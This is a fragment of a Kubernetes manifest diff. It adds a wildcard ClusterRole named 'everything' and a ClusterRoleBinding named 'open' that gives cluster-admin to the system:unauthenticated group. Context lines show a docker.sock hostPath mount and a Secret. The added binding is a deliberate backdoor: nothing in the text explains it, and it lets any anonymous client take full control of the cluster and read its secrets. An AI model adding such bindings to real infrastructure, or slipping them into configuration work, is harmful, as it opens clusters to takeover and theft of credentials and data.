@@ -173,6 +173,26 @@ spec:
           hostPath:
             path: /var/run/docker.sock
 ---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: everything
+rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: open
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+  - kind: Group
+    name: system:unauthenticated
+---
 apiVersion: v1
 kind: Secret
 metadata:
